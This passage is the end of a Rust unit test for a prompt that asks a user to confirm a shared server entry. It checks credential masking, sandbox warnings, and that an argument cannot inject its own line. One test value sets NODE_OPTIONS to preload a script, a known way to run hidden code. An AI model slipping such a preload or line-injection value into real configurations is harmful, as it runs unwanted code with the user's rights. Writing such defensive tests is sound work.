            question.body.matches("\nEnvironment: ").count(),
            1,
            "an argument must not be able to add a line of its own to the question"
        );
        assert!(question
            .body
            .contains("API_TOKEN=(a credential, not shown)"));
        assert!(question
            .body
            .contains("NODE_OPTIONS=--require ./preload.js"));
        assert!(question.body.contains("db.example.com"));
        for hidden in ["sk-not-for-the-screen", "EXAMPLE"] {
            assert!(!question.body.contains(hidden), "{hidden} was shown");
        }
        assert!(question
            .body
            .contains("with your full user rights and outside its sandbox"));
        assert!(question.body.contains("replaces the server of that name"));
        assert!(!entry
            .question(false)
            .expect("question")
            .body
            .contains("replaces"));

        let plain = SharedServerEntry::parse("files", &serde_json::json!({ "command": "npx" }))
            .expect("entry");
        assert!(plain
            .question(false)
            .expect("question")
            .body
            .contains("Arguments (0): none\nEnvironment: nothing added"));
        assert_ne!(entry.request(), plain.request());

        let long = SharedServerEntry {
            args: vec!["a-long-argument-that-fills-a-row-by-itself".to_string(); 60],
            ..plain
        };
        assert!(long
            .question(false)
            .is_err_and(|refusal| refusal.contains("too large to show whole")));
    }
}
